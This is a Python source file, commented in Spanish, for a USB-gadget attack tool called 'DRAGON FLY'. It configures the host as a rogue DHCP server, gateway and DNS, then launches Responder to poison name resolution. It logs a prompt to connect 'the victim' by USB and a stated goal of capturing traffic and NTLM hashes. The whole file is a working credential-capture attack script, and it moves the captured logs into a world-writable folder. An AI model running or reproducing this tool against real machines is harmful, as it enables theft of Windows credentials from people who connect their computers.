# poison_logic.py (versión con corrección de rango IP y DHCP)
import os
import subprocess
import time
import re
import threading
import glob

class PoisonAttack:
    def __init__(self, interface=None, callback_consola=None, session_dir=None):
        self.interface = interface or self._detectar_interfaz_gadget()
        self.callback = callback_consola
        self.session_dir = session_dir
        self.stop_event = threading.Event()
        self.dns_proc = None
        self.proc_responder = None

    def log(self, texto):
        texto_limpio = re.sub(r'\x1b\[[0-9;]*m', '', texto)
        for simbolo in ['¤', '[0m', '[1;32m', '[1;34m', '[0;33m']:
            texto_limpio = texto_limpio.replace(simbolo, '')
        if self.callback:
            self.callback(f"{texto_limpio}")
        else:
            print(texto_limpio)

    def _detectar_interfaz_gadget(self):
        """Busca la interfaz de red que actúa como gadget USB (RNDIS/ECM)."""
        try:
            for iface in os.listdir('/sys/class/net/'):
                if iface == 'lo':
                    continue
                type_path = f'/sys/class/net/{iface}/type'
                if os.path.exists(type_path):
                    with open(type_path) as f:
                        iface_type = f.read().strip()
                    # Tipo 1 = Ethernet normal, 772 = gadget Ethernet
                    if iface_type == '772' or iface.startswith('usb') or iface.startswith('enx'):
                        if os.path.exists(f'/sys/class/net/{iface}/address'):
                            return iface
            if os.path.exists('/sys/class/net/usb0'):
                return 'usb0'
        except Exception:
            pass
        return 'usb0'  # fallback

    def _limpiar_procesos_previos(self):
        os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
        os.system("sudo pkill -f responder > /dev/null 2>&1")
        os.system(f"sudo fuser -k 53/udp > /dev/null 2>&1")
        os.system(f"sudo fuser -k 67/udp > /dev/null 2>&1")
        time.sleep(1)

    def start(self):
        self._limpiar_procesos_previos()
        iface = self.interface

        self.log(f"\n[!] DRAGON FLY SYSTEM")
        self.log(f"[*] Configurando interfaz: {iface}")

        try:
            self.log("[*] Desvinculando interfaz de NetworkManager...")
            os.system(f"sudo nmcli device set {iface} managed no > /dev/null 2>&1")

            self.log("[*] Levantando interfaz...")
            os.system(f"sudo ip link set {iface} up")
            time.sleep(3)

            # Nueva IP privada estándar (192.168.10.1/24)
            ip = "192.168.10.1"
            subnet_mask = "24"
            ip_range = "192.168.10.10,192.168.10.250,255.255.255.0,12h"

            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 > /dev/null 2>&1")
            self.log(f"[*] Asignando IP estática {ip}/{subnet_mask} a {iface}...")
            os.system(f"sudo ip addr flush dev {iface}")
            os.system(f"sudo ip addr add {ip}/{subnet_mask} dev {iface}")

            self.log("[*] Inyectando rutas estáticas...")
            # Ruta para la subred local
            os.system(f"sudo ip route add 192.168.10.0/{subnet_mask} dev {iface} 2>/dev/null")
            os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")

            # Configuración de dnsmasq SIN option 121
            config_dhcp = (
                f"interface={iface}\n"
                f"dhcp-range={ip_range}\n"
                f"dhcp-option=3,{ip}\n"     # gateway
                f"dhcp-option=6,{ip}\n"     # DNS
                f"bind-interfaces\n"
            )
            with open("dnsmasq_temp.conf", "w") as f:
                f.write(config_dhcp)

            self.log("[*] Lanzando servidor DHCP (dnsmasq)...")
            self.dns_proc = subprocess.Popen(
                ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(2)

            # Verificar que dnsmasq está escuchando
            try:
                ss_output = subprocess.check_output("sudo ss -tulnp | grep dnsmasq", shell=True, text=True)
                self.log("[+] dnsmasq está escuchando en:")
                for line in ss_output.splitlines():
                    self.log(f"    {line.strip()}")
            except:
                self.log("[!] No se pudo verificar dnsmasq, revisa manualmente")

            # Lanzar Responder con la misma IP
            if os.path.exists("/usr/share/responder/Responder.py"):
                comando = ["sudo", "python3", "/usr/share/responder/Responder.py", "-I", iface, "-wvF"]
            elif os.path.exists("/opt/Responder/Responder.py"):
                comando = ["sudo", "python3", "/opt/Responder/Responder.py", "-I", iface, "-wvF"]
            else:
                comando = ["sudo", "responder", "-I", iface, "-wvF"]

            self.log(f"[+] INTERFAZ LISTA: {iface}")
            self.log(f"[+] IP: {ip}/{subnet_mask}")
            self.log(f"[+] OBJETIVO: Captura de tráfico y hashes NTLM")
            self.log(f"[+] Conecta ahora la víctima al puerto USB")

            self.proc_responder = subprocess.Popen(
                comando,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )

            while not self.stop_event.is_set():
                linea = self.proc_responder.stdout.readline()
                if not linea and self.proc_responder.poll() is not None:
                    break
                if linea:
                    self.log(linea.strip())

        except Exception as e:
            self.log(f"\n[!] Error crítico: {e}")
        finally:
            self._cleanup()

    def _cleanup(self):
        self.log("\n[*] Deteniendo procesos y restaurando red...")
        if self.dns_proc:
            try:
                self.dns_proc.terminate()
                self.dns_proc.wait(timeout=3)
            except:
                self.dns_proc.kill()
            self.dns_proc = None

        if self.proc_responder:
            try:
                self.proc_responder.terminate()
                self.proc_responder.wait(timeout=3)
            except:
                self.proc_responder.kill()
            self.proc_responder = None

        os.system("sudo pkill -f responder > /dev/null 2>&1")
        os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
        os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null")
        os.system(f"sudo ip addr flush dev {self.interface} > /dev/null 2>&1")
        if os.path.exists("dnsmasq_temp.conf"):
            os.remove("dnsmasq_temp.conf")

        if self.session_dir:
            self.log(f"[*] Organizando evidencia en: {os.path.basename(self.session_dir)}")
            os.makedirs(self.session_dir, exist_ok=True)
            for log_dir in ["/usr/share/responder/logs", "/opt/Responder/logs"]:
                if os.path.isdir(log_dir):
                    for f in glob.glob(os.path.join(log_dir, "*")):
                        try:
                            os.rename(f, os.path.join(self.session_dir, os.path.basename(f)))
                        except:
                            subprocess.run(["sudo", "mv", f, self.session_dir], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "chmod", "-R", "777", self.session_dir], stderr=subprocess.DEVNULL)

        self.log("[+] Sistema restaurado. ¡Cacería finalizada!")

    def stop(self):
        self.stop_event.set()
        if self.proc_responder:
            try:
                self.proc_responder.terminate()
            except:
                pass
        if self.dns_proc:
            try:
                self.dns_proc.terminate()
            except:
                pass
